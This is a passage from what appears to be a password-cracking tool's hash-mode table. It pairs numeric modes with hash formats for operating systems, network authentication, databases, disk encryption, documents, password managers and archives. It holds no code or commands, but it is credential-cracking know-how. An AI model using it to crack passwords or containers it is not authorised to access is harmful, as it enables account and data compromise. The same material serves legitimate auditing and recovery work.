   3800 | md5($salt.$pass.$salt)                                     | Raw Hash salted and/or iterated
   3710 | md5($salt.md5($pass))                                      | Raw Hash salted and/or iterated
   4110 | md5($salt.md5($pass.$salt))                                | Raw Hash salted and/or iterated
   4010 | md5($salt.md5($salt.$pass))                                | Raw Hash salted and/or iterated
  21300 | md5($salt.sha1($salt.$pass))                               | Raw Hash salted and/or iterated
     40 | md5($salt.utf16le($pass))                                  | Raw Hash salted and/or iterated
   2600 | md5(md5($pass))                                            | Raw Hash salted and/or iterated
   3910 | md5(md5($pass).md5($salt))                                 | Raw Hash salted and/or iterated
   3500 | md5(md5(md5($pass)))                                       | Raw Hash salted and/or iterated
   4400 | md5(sha1($pass))                                           | Raw Hash salted and/or iterated
   4410 | md5(sha1($pass).$salt)                                     | Raw Hash salted and/or iterated
  20900 | md5(sha1($pass).md5($pass).sha1($pass))                    | Raw Hash salted and/or iterated
  21200 | md5(sha1($salt).md5($pass))                                | Raw Hash salted and/or iterated
   4300 | md5(strtoupper(md5($pass)))                                | Raw Hash salted and/or iterated
     30 | md5(utf16le($pass).$salt)                                  | Raw Hash salted and/or iterated
    110 | sha1($pass.$salt)                                          | Raw Hash salted and/or iterated
    120 | sha1($salt.$pass)                                          | Raw Hash salted and/or iterated
   4900 | sha1($salt.$pass.$salt)                                    | Raw Hash salted and/or iterated
   4520 | sha1($salt.sha1($pass))                                    | Raw Hash salted and/or iterated
  24300 | sha1($salt.sha1($pass.$salt))                              | Raw Hash salted and/or iterated
    140 | sha1($salt.utf16le($pass))                                 | Raw Hash salted and/or iterated
  19300 | sha1($salt1.$pass.$salt2)                                  | Raw Hash salted and/or iterated
  14400 | sha1(CX)                                                   | Raw Hash salted and/or iterated
   4700 | sha1(md5($pass))                                           | Raw Hash salted and/or iterated
   4710 | sha1(md5($pass).$salt)                                     | Raw Hash salted and/or iterated
  21100 | sha1(md5($pass.$salt))                                     | Raw Hash salted and/or iterated
  18500 | sha1(md5(md5($pass)))                                      | Raw Hash salted and/or iterated
   4500 | sha1(sha1($pass))                                          | Raw Hash salted and/or iterated
   4510 | sha1(sha1($pass).$salt)                                    | Raw Hash salted and/or iterated
   5000 | sha1(sha1($salt.$pass.$salt))                              | Raw Hash salted and/or iterated
    130 | sha1(utf16le($pass).$salt)                                 | Raw Hash salted and/or iterated
   1410 | sha256($pass.$salt)                                        | Raw Hash salted and/or iterated
   1420 | sha256($salt.$pass)                                        | Raw Hash salted and/or iterated
  22300 | sha256($salt.$pass.$salt)                                  | Raw Hash salted and/or iterated
  20720 | sha256($salt.sha256($pass))                                | Raw Hash salted and/or iterated
  21420 | sha256($salt.sha256_bin($pass))                            | Raw Hash salted and/or iterated
   1440 | sha256($salt.utf16le($pass))                               | Raw Hash salted and/or iterated
  20800 | sha256(md5($pass))                                         | Raw Hash salted and/or iterated
  20710 | sha256(sha256($pass).$salt)                                | Raw Hash salted and/or iterated
  21400 | sha256(sha256_bin($pass))                                  | Raw Hash salted and/or iterated
   1430 | sha256(utf16le($pass).$salt)                               | Raw Hash salted and/or iterated
  10810 | sha384($pass.$salt)                                        | Raw Hash salted and/or iterated
  10820 | sha384($salt.$pass)                                        | Raw Hash salted and/or iterated
  10840 | sha384($salt.utf16le($pass))                               | Raw Hash salted and/or iterated
  10830 | sha384(utf16le($pass).$salt)                               | Raw Hash salted and/or iterated
   1710 | sha512($pass.$salt)                                        | Raw Hash salted and/or iterated
   1720 | sha512($salt.$pass)                                        | Raw Hash salted and/or iterated
   1740 | sha512($salt.utf16le($pass))                               | Raw Hash salted and/or iterated
   1730 | sha512(utf16le($pass).$salt)                               | Raw Hash salted and/or iterated
     50 | HMAC-MD5 (key = $pass)                                     | Raw Hash authenticated
     60 | HMAC-MD5 (key = $salt)                                     | Raw Hash authenticated
    150 | HMAC-SHA1 (key = $pass)                                    | Raw Hash authenticated
    160 | HMAC-SHA1 (key = $salt)                                    | Raw Hash authenticated
   1450 | HMAC-SHA256 (key = $pass)                                  | Raw Hash authenticated
   1460 | HMAC-SHA256 (key = $salt)                                  | Raw Hash authenticated
   1750 | HMAC-SHA512 (key = $pass)                                  | Raw Hash authenticated
   1760 | HMAC-SHA512 (key = $salt)                                  | Raw Hash authenticated
  11750 | HMAC-Streebog-256 (key = $pass), big-endian                | Raw Hash authenticated
  11760 | HMAC-Streebog-256 (key = $salt), big-endian                | Raw Hash authenticated
  11850 | HMAC-Streebog-512 (key = $pass), big-endian                | Raw Hash authenticated
  11860 | HMAC-Streebog-512 (key = $salt), big-endian                | Raw Hash authenticated
  28700 | Amazon AWS4-HMAC-SHA256                                    | Raw Hash authenticated
  11500 | CRC32                                                      | Raw Checksum
  27900 | CRC32C                                                     | Raw Checksum
  28000 | CRC64Jones                                                 | Raw Checksum
  18700 | Java Object hashCode()                                     | Raw Checksum
  25700 | MurmurHash                                                 | Raw Checksum
  27800 | MurmurHash3                                                | Raw Checksum
  14100 | 3DES (PT = $salt, key = $pass)                             | Raw Cipher, Known-plaintext attack
  14000 | DES (PT = $salt, key = $pass)                              | Raw Cipher, Known-plaintext attack
  26401 | AES-128-ECB NOKDF (PT = $salt, key = $pass)                | Raw Cipher, Known-plaintext attack
  26402 | AES-192-ECB NOKDF (PT = $salt, key = $pass)                | Raw Cipher, Known-plaintext attack
  26403 | AES-256-ECB NOKDF (PT = $salt, key = $pass)                | Raw Cipher, Known-plaintext attack
  15400 | ChaCha20                                                   | Raw Cipher, Known-plaintext attack
  14500 | Linux Kernel Crypto API (2.4)                              | Raw Cipher, Known-plaintext attack
  14900 | Skip32 (PT = $salt, key = $pass)                           | Raw Cipher, Known-plaintext attack
  11900 | PBKDF2-HMAC-MD5                                            | Generic KDF
  12000 | PBKDF2-HMAC-SHA1                                           | Generic KDF
  10900 | PBKDF2-HMAC-SHA256                                         | Generic KDF
  12100 | PBKDF2-HMAC-SHA512                                         | Generic KDF
   8900 | scrypt                                                     | Generic KDF
    400 | phpass                                                     | Generic KDF
  16100 | TACACS+                                                    | Network Protocol
  11400 | SIP digest authentication (MD5)                            | Network Protocol
   5300 | IKE-PSK MD5                                                | Network Protocol
   5400 | IKE-PSK SHA1                                               | Network Protocol
  25100 | SNMPv3 HMAC-MD5-96                                         | Network Protocol
  25000 | SNMPv3 HMAC-MD5-96/HMAC-SHA1-96                            | Network Protocol
  25200 | SNMPv3 HMAC-SHA1-96                                        | Network Protocol
  26700 | SNMPv3 HMAC-SHA224-128                                     | Network Protocol
  26800 | SNMPv3 HMAC-SHA256-192                                     | Network Protocol
  26900 | SNMPv3 HMAC-SHA384-256                                     | Network Protocol
  27300 | SNMPv3 HMAC-SHA512-384                                     | Network Protocol
   2500 | WPA-EAPOL-PBKDF2                                           | Network Protocol
   2501 | WPA-EAPOL-PMK                                              | Network Protocol
  22000 | WPA-PBKDF2-PMKID+EAPOL                                     | Network Protocol
  22001 | WPA-PMK-PMKID+EAPOL                                        | Network Protocol
  16800 | WPA-PMKID-PBKDF2                                           | Network Protocol
  16801 | WPA-PMKID-PMK                                              | Network Protocol
   7300 | IPMI2 RAKP HMAC-SHA1                                       | Network Protocol
  10200 | CRAM-MD5                                                   | Network Protocol
  16500 | JWT (JSON Web Token)                                       | Network Protocol
  29200 | Radmin3                                                    | Network Protocol
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
  29100 | Flask Session Cookie ($salt.$salt.$pass)                   | Network Protocol
   4800 | iSCSI CHAP authentication, MD5(CHAP)                       | Network Protocol
   8500 | RACF                                                       | Operating System
   6300 | AIX [smd5]                                                 | Operating System
   6700 | AIX [ssha1]                                                | Operating System
   6400 | AIX [ssha256]                                              | Operating System
   6500 | AIX [ssha512]                                              | Operating System
   3000 | LM                                                         | Operating System
  19000 | QNX /etc/shadow (MD5)                                      | Operating System
  19100 | QNX /etc/shadow (SHA256)                                   | Operating System
  19200 | QNX /etc/shadow (SHA512)                                   | Operating System
  15300 | DPAPI masterkey file v1 (context 1 and 2)                  | Operating System
  15310 | DPAPI masterkey file v1 (context 3)                        | Operating System
  15900 | DPAPI masterkey file v2 (context 1 and 2)                  | Operating System
  15910 | DPAPI masterkey file v2 (context 3)                        | Operating System
   7200 | GRUB 2                                                     | Operating System
  12800 | MS-AzureSync PBKDF2-HMAC-SHA256                            | Operating System
  12400 | BSDi Crypt, Extended DES                                   | Operating System
   1000 | NTLM                                                       | Operating System
   9900 | Radmin2                                                    | Operating System
   5800 | Samsung Android Password/PIN                               | Operating System
  28100 | Windows Hello PIN/Password                                 | Operating System
  13800 | Windows Phone 8+ PIN/password                              | Operating System
   2410 | Cisco-ASA MD5                                              | Operating System
   9200 | Cisco-IOS $8$ (PBKDF2-SHA256)                              | Operating System
   9300 | Cisco-IOS $9$ (scrypt)                                     | Operating System
   5700 | Cisco-IOS type 4 (SHA256)                                  | Operating System
   2400 | Cisco-PIX MD5                                              | Operating System
   8100 | Citrix NetScaler (SHA1)                                    | Operating System
  22200 | Citrix NetScaler (SHA512)                                  | Operating System
   1100 | Domain Cached Credentials (DCC), MS Cache                  | Operating System
   2100 | Domain Cached Credentials 2 (DCC2), MS Cache 2             | Operating System
   7000 | FortiGate (FortiOS)                                        | Operating System
  26300 | FortiGate256 (FortiOS256)                                  | Operating System
    125 | ArubaOS                                                    | Operating System
    501 | Juniper IVE                                                | Operating System
     22 | Juniper NetScreen/SSG (ScreenOS)                           | Operating System
  15100 | Juniper/NetBSD sha1crypt                                   | Operating System
  26500 | iPhone passcode (UID key + System Keybag)                  | Operating System
    122 | macOS v10.4, macOS v10.5, macOS v10.6                      | Operating System
   1722 | macOS v10.7                                                | Operating System
   7100 | macOS v10.8+ (PBKDF2-SHA512)                               | Operating System
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
    500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)                  | Operating System
   1500 | descrypt, DES (Unix), Traditional DES                      | Operating System
  29000 | sha1($salt.sha1(utf16le($username).':'.utf16le($pass)))    | Operating System
   7400 | sha256crypt $5$, SHA256 (Unix)                             | Operating System
   1800 | sha512crypt $6$, SHA512 (Unix)                             | Operating System
  24600 | SQLCipher                                                  | Database Server
    131 | MSSQL (2000)                                               | Database Server
    132 | MSSQL (2005)                                               | Database Server
   1731 | MSSQL (2012, 2014)                                         | Database Server
  24100 | MongoDB ServerKey SCRAM-SHA-1                              | Database Server
  24200 | MongoDB ServerKey SCRAM-SHA-256                            | Database Server
     12 | PostgreSQL                                                 | Database Server
  11100 | PostgreSQL CRAM (MD5)                                      | Database Server
  28600 | PostgreSQL SCRAM-SHA-256                                   | Database Server
   3100 | Oracle H: Type (Oracle 7+)                                 | Database Server
    112 | Oracle S: Type (Oracle 11+)                                | Database Server
  12300 | Oracle T: Type (Oracle 12+)                                | Database Server
   7401 | MySQL $A$ (sha256crypt)                                    | Database Server
  11200 | MySQL CRAM (SHA1)                                          | Database Server
    200 | MySQL323                                                   | Database Server
    300 | MySQL4.1/MySQL5                                            | Database Server
   8000 | Sybase ASE                                                 | Database Server
   8300 | DNSSEC (NSEC3)                                             | FTP, HTTP, SMTP, LDAP Server
  25900 | KNX IP Secure - Device Authentication Code                 | FTP, HTTP, SMTP, LDAP Server
  16400 | CRAM-MD5 Dovecot                                           | FTP, HTTP, SMTP, LDAP Server
   1411 | SSHA-256(Base64), LDAP {SSHA256}                           | FTP, HTTP, SMTP, LDAP Server
   1711 | SSHA-512(Base64), LDAP {SSHA512}                           | FTP, HTTP, SMTP, LDAP Server
  24900 | Dahua Authentication MD5                                   | FTP, HTTP, SMTP, LDAP Server
  10901 | RedHat 389-DS LDAP (PBKDF2-HMAC-SHA256)                    | FTP, HTTP, SMTP, LDAP Server
  15000 | FileZilla Server >= 0.9.55                                 | FTP, HTTP, SMTP, LDAP Server
  12600 | ColdFusion 10+                                             | FTP, HTTP, SMTP, LDAP Server
   1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)                      | FTP, HTTP, SMTP, LDAP Server
    141 | Episerver 6.x < .NET 4                                     | FTP, HTTP, SMTP, LDAP Server
   1441 | Episerver 6.x >= .NET 4                                    | FTP, HTTP, SMTP, LDAP Server
   1421 | hMailServer                                                | FTP, HTTP, SMTP, LDAP Server
    101 | nsldap, SHA-1(Base64), Netscape LDAP SHA                   | FTP, HTTP, SMTP, LDAP Server
    111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA                | FTP, HTTP, SMTP, LDAP Server
   7700 | SAP CODVN B (BCODE)                                        | Enterprise Application Software (EAS)
   7701 | SAP CODVN B (BCODE) from RFC_READ_TABLE                    | Enterprise Application Software (EAS)
   7800 | SAP CODVN F/G (PASSCODE)                                   | Enterprise Application Software (EAS)
   7801 | SAP CODVN F/G (PASSCODE) from RFC_READ_TABLE               | Enterprise Application Software (EAS)
  10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                        | Enterprise Application Software (EAS)
    133 | PeopleSoft                                                 | Enterprise Application Software (EAS)
  13500 | PeopleSoft PS_TOKEN                                        | Enterprise Application Software (EAS)
  21500 | SolarWinds Orion                                           | Enterprise Application Software (EAS)
  21501 | SolarWinds Orion v2                                        | Enterprise Application Software (EAS)
     24 | SolarWinds Serv-U                                          | Enterprise Application Software (EAS)
   8600 | Lotus Notes/Domino 5                                       | Enterprise Application Software (EAS)
   8700 | Lotus Notes/Domino 6                                       | Enterprise Application Software (EAS)
   9100 | Lotus Notes/Domino 8                                       | Enterprise Application Software (EAS)
  26200 | OpenEdge Progress Encode                                   | Enterprise Application Software (EAS)
  20600 | Oracle Transportation Management (SHA256)                  | Enterprise Application Software (EAS)
   4711 | Huawei sha1(md5($pass).$salt)                              | Enterprise Application Software (EAS)
  20711 | AuthMe sha256                                              | Enterprise Application Software (EAS)
  22400 | AES Crypt (SHA256)                                         | Full-Disk Encryption (FDE)
  27400 | VMware VMX (PBKDF2-HMAC-SHA1 + AES-256-CBC)                | Full-Disk Encryption (FDE)
  14600 | LUKS v1 (legacy)                                           | Full-Disk Encryption (FDE)
  29541 | LUKS v1 RIPEMD-160 + AES                                   | Full-Disk Encryption (FDE)
  29542 | LUKS v1 RIPEMD-160 + Serpent                               | Full-Disk Encryption (FDE)
  29543 | LUKS v1 RIPEMD-160 + Twofish                               | Full-Disk Encryption (FDE)
  29511 | LUKS v1 SHA-1 + AES                                        | Full-Disk Encryption (FDE)
  29512 | LUKS v1 SHA-1 + Serpent                                    | Full-Disk Encryption (FDE)
  29513 | LUKS v1 SHA-1 + Twofish                                    | Full-Disk Encryption (FDE)
  29521 | LUKS v1 SHA-256 + AES                                      | Full-Disk Encryption (FDE)
  29522 | LUKS v1 SHA-256 + Serpent                                  | Full-Disk Encryption (FDE)
  29523 | LUKS v1 SHA-256 + Twofish                                  | Full-Disk Encryption (FDE)
  29531 | LUKS v1 SHA-512 + AES                                      | Full-Disk Encryption (FDE)
  29532 | LUKS v1 SHA-512 + Serpent                                  | Full-Disk Encryption (FDE)
  29533 | LUKS v1 SHA-512 + Twofish                                  | Full-Disk Encryption (FDE)
  13711 | VeraCrypt RIPEMD160 + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
  13712 | VeraCrypt RIPEMD160 + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
  13713 | VeraCrypt RIPEMD160 + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
  13741 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)     | Full-Disk Encryption (FDE)
  13742 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
  13743 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
  29411 | VeraCrypt RIPEMD160 + XTS 512 bit                          | Full-Disk Encryption (FDE)
  29412 | VeraCrypt RIPEMD160 + XTS 1024 bit                         | Full-Disk Encryption (FDE)
  29413 | VeraCrypt RIPEMD160 + XTS 1536 bit                         | Full-Disk Encryption (FDE)
  29441 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode              | Full-Disk Encryption (FDE)
  29442 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode             | Full-Disk Encryption (FDE)
  29443 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode             | Full-Disk Encryption (FDE)
  13751 | VeraCrypt SHA256 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
  13752 | VeraCrypt SHA256 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
  13753 | VeraCrypt SHA256 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
  13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode (legacy)        | Full-Disk Encryption (FDE)
  13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode (legacy)       | Full-Disk Encryption (FDE)
  13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode (legacy)       | Full-Disk Encryption (FDE)
  29451 | VeraCrypt SHA256 + XTS 512 bit                             | Full-Disk Encryption (FDE)
  29452 | VeraCrypt SHA256 + XTS 1024 bit                            | Full-Disk Encryption (FDE)
  29453 | VeraCrypt SHA256 + XTS 1536 bit                            | Full-Disk Encryption (FDE)
  29461 | VeraCrypt SHA256 + XTS 512 bit + boot-mode                 | Full-Disk Encryption (FDE)
  29462 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode                | Full-Disk Encryption (FDE)
  29463 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode                | Full-Disk Encryption (FDE)
  13721 | VeraCrypt SHA512 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
  13722 | VeraCrypt SHA512 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
  13723 | VeraCrypt SHA512 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
  29421 | VeraCrypt SHA512 + XTS 512 bit                             | Full-Disk Encryption (FDE)
  29422 | VeraCrypt SHA512 + XTS 1024 bit                            | Full-Disk Encryption (FDE)
  29423 | VeraCrypt SHA512 + XTS 1536 bit                            | Full-Disk Encryption (FDE)
  13771 | VeraCrypt Streebog-512 + XTS 512 bit (legacy)              | Full-Disk Encryption (FDE)
  13772 | VeraCrypt Streebog-512 + XTS 1024 bit (legacy)             | Full-Disk Encryption (FDE)
  13773 | VeraCrypt Streebog-512 + XTS 1536 bit (legacy)             | Full-Disk Encryption (FDE)
  13781 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode (legacy)  | Full-Disk Encryption (FDE)
  13782 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode (legacy) | Full-Disk Encryption (FDE)
  13783 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode (legacy) | Full-Disk Encryption (FDE)
  29471 | VeraCrypt Streebog-512 + XTS 512 bit                       | Full-Disk Encryption (FDE)
  29472 | VeraCrypt Streebog-512 + XTS 1024 bit                      | Full-Disk Encryption (FDE)
  29473 | VeraCrypt Streebog-512 + XTS 1536 bit                      | Full-Disk Encryption (FDE)
  29481 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode           | Full-Disk Encryption (FDE)
  29482 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode          | Full-Disk Encryption (FDE)
  29483 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode          | Full-Disk Encryption (FDE)
  13731 | VeraCrypt Whirlpool + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
  13732 | VeraCrypt Whirlpool + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
  13733 | VeraCrypt Whirlpool + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
  29431 | VeraCrypt Whirlpool + XTS 512 bit                          | Full-Disk Encryption (FDE)
  29432 | VeraCrypt Whirlpool + XTS 1024 bit                         | Full-Disk Encryption (FDE)
  29433 | VeraCrypt Whirlpool + XTS 1536 bit                         | Full-Disk Encryption (FDE)
  23900 | BestCrypt v3 Volume Encryption                             | Full-Disk Encryption (FDE)
  16700 | FileVault 2                                                | Full-Disk Encryption (FDE)
  27500 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-128-XTS)              | Full-Disk Encryption (FDE)
  27600 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-256-XTS)              | Full-Disk Encryption (FDE)
  20011 | DiskCryptor SHA512 + XTS 512 bit                           | Full-Disk Encryption (FDE)
  20012 | DiskCryptor SHA512 + XTS 1024 bit                          | Full-Disk Encryption (FDE)
  20013 | DiskCryptor SHA512 + XTS 1536 bit                          | Full-Disk Encryption (FDE)
  22100 | BitLocker                                                  | Full-Disk Encryption (FDE)
  12900 | Android FDE (Samsung DEK)                                  | Full-Disk Encryption (FDE)
   8800 | Android FDE <= 4.3                                         | Full-Disk Encryption (FDE)
  18300 | Apple File System (APFS)                                   | Full-Disk Encryption (FDE)
   6211 | TrueCrypt RIPEMD160 + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
   6212 | TrueCrypt RIPEMD160 + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
   6213 | TrueCrypt RIPEMD160 + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
   6241 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)     | Full-Disk Encryption (FDE)
   6242 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
   6243 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
  29311 | TrueCrypt RIPEMD160 + XTS 512 bit                          | Full-Disk Encryption (FDE)
  29312 | TrueCrypt RIPEMD160 + XTS 1024 bit                         | Full-Disk Encryption (FDE)
  29313 | TrueCrypt RIPEMD160 + XTS 1536 bit                         | Full-Disk Encryption (FDE)
  29341 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode              | Full-Disk Encryption (FDE)
  29342 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode             | Full-Disk Encryption (FDE)
  29343 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode             | Full-Disk Encryption (FDE)
   6221 | TrueCrypt SHA512 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
   6222 | TrueCrypt SHA512 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
   6223 | TrueCrypt SHA512 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
  29321 | TrueCrypt SHA512 + XTS 512 bit                             | Full-Disk Encryption (FDE)
  29322 | TrueCrypt SHA512 + XTS 1024 bit                            | Full-Disk Encryption (FDE)
  29323 | TrueCrypt SHA512 + XTS 1536 bit                            | Full-Disk Encryption (FDE)
   6231 | TrueCrypt Whirlpool + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
   6232 | TrueCrypt Whirlpool + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
   6233 | TrueCrypt Whirlpool + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
  29331 | TrueCrypt Whirlpool + XTS 512 bit                          | Full-Disk Encryption (FDE)
  29332 | TrueCrypt Whirlpool + XTS 1024 bit                         | Full-Disk Encryption (FDE)
  29333 | TrueCrypt Whirlpool + XTS 1536 bit                         | Full-Disk Encryption (FDE)
  12200 | eCryptfs                                                   | Full-Disk Encryption (FDE)
  10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                              | Document
  10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1                 | Document
  10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2                 | Document
  10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                              | Document
  25400 | PDF 1.4 - 1.6 (Acrobat 5 - 8) - user and owner pass        | Document
  10600 | PDF 1.7 Level 3 (Acrobat 9)                                | Document
  10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                          | Document
   9400 | MS Office 2007                                             | Document
   9500 | MS Office 2010                                             | Document
   9600 | MS Office 2013                                             | Document
  25300 | MS Office 2016 - SheetProtection                           | Document
   9700 | MS Office <= 2003 $0/$1, MD5 + RC4                         | Document
   9710 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #1            | Document
   9720 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #2            | Document
   9810 | MS Office <= 2003 $3, SHA1 + RC4, collider #1              | Document
   9820 | MS Office <= 2003 $3, SHA1 + RC4, collider #2              | Document
   9800 | MS Office <= 2003 $3/$4, SHA1 + RC4                        | Document
  18400 | Open Document Format (ODF) 1.2 (SHA-256, AES)              | Document
  18600 | Open Document Format (ODF) 1.1 (SHA-1, Blowfish)           | Document
  16200 | Apple Secure Notes                                         | Document
  23300 | Apple iWork                                                | Document
   6600 | 1Password, agilekeychain                                   | Password Manager
   8200 | 1Password, cloudkeychain                                   | Password Manager
   9000 | Password Safe v2                                           | Password Manager
   5200 | Password Safe v3                                           | Password Manager
   6800 | LastPass + LastPass sniffed                                | Password Manager
  13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                | Password Manager
  29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager
  23400 | Bitwarden                                                  | Password Manager
  16900 | Ansible Vault                                              | Password Manager
  26000 | Mozilla key3.db                                            | Password Manager
  26100 | Mozilla key4.db                                            | Password Manager
  23100 | Apple Keychain                                             | Password Manager
  11600 | 7-Zip                                                      | Archive
  12500 | RAR3-hp                                                    | Archive
  23800 | RAR3-p (Compressed)                                        | Archive
  23700 | RAR3-p (Uncompressed)                                      | Archive
  13000 | RAR5                                                       | Archive
  17220 | PKZIP (Compressed Multi-File)                              | Archive
  17200 | PKZIP (Compressed)                                         | Archive
  17225 | PKZIP (Mixed Multi-File)                                   | Archive
  17230 | PKZIP (Mixed Multi-File Checksum-Only)                     | Archive
  17210 | PKZIP (Uncompressed)                                       | Archive
  20500 | PKZIP Master Key                                           | Archive
  20510 | PKZIP Master Key (6 byte optimization)                     | Archive
  23001 | SecureZIP AES-128                                          | Archive
  23002 | SecureZIP AES-192                                          | Archive
  23003 | SecureZIP AES-256                                          | Archive
  13600 | WinZip                                                     | Archive
  18900 | Android Backup                                             | Archive
  24700 | Stuffit5                                                   | Archive
  13200 | AxCrypt 1                                                  | Archive
  13300 | AxCrypt 1 in-memory SHA1                                   | Archive
  23500 | AxCrypt 2 AES-128                                          | Archive
  23600 | AxCrypt 2 AES-256                                          | Archive
  14700 | iTunes backup < 10.0                                       | Archive
  14800 | iTunes backup >= 10.0                                      | Archive
   8400 | WBB3 (Woltlab Burning Board)                               | Forums, CMS, E-Commerce
   2612 | PHPS                                                       | Forums, CMS, E-Commerce
    121 | SMF (Simple Machines Forum) > v1.1                         | Forums, CMS, E-Commerce
   3711 | MediaWiki B type                                           | Forums, CMS, E-Commerce
   4521 | Redmine                                                    | Forums, CMS, E-Commerce
  24800 | Umbraco HMAC-SHA1                                          | Forums, CMS, E-Commerce
     11 | Joomla < 2.5.18                                            | Forums, CMS, E-Commerce
  13900 | OpenCart                                                   | Forums, CMS, E-Commerce
  11000 | PrestaShop                                                 | Forums, CMS, E-Commerce
  16000 | Tripcode                                                   | Forums, CMS, E-Commerce
   7900 | Drupal7                                                    | Forums, CMS, E-Commerce
   4522 | PunBB                                                      | Forums, CMS, E-Commerce
   2811 | MyBB 1.2+, IPB2+ (Invision Power Board)                    | Forums, CMS, E-Commerce
   2611 | vBulletin < v3.8.5                                         | Forums, CMS, E-Commerce
   2711 | vBulletin >= v3.8.5                                        | Forums, CMS, E-Commerce
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
     21 | osCommerce, xt:Commerce                                    | Forums, CMS, E-Commerce
  18100 | TOTP (HMAC-SHA1)                                           | One-Time Password
   2000 | STDOUT                                                     | Plaintext
  99999 | Plaintext                                                  | Plaintext
  21600 | Web2py pbkdf2-sha512                                       | Framework
  10000 | Django (PBKDF2-SHA256)                                     | Framework
    124 | Django (SHA-1)                                             | Framework
  12001 | Atlassian (PBKDF2-HMAC-SHA1)                               | Framework
  19500 | Ruby on Rails Restful-Authentication                       | Framework
  27200 | Ruby on Rails Restful Auth (one round, no sitekey)         | Framework
  30000 | Python Werkzeug MD5 (HMAC-MD5 (key = $salt))               | Framework
  30120 | Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt))         | Framework
  20200 | Python passlib pbkdf2-sha512                               | Framework
  20300 | Python passlib pbkdf2-sha256                               | Framework
  20400 | Python passlib pbkdf2-sha1                                 | Framework
  24410 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA1 + 3DES/AES)          | Private Key
  24420 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA256 + 3DES/AES)        | Private Key
  15500 | JKS Java Key Store Private Keys (SHA1)                     | Private Key
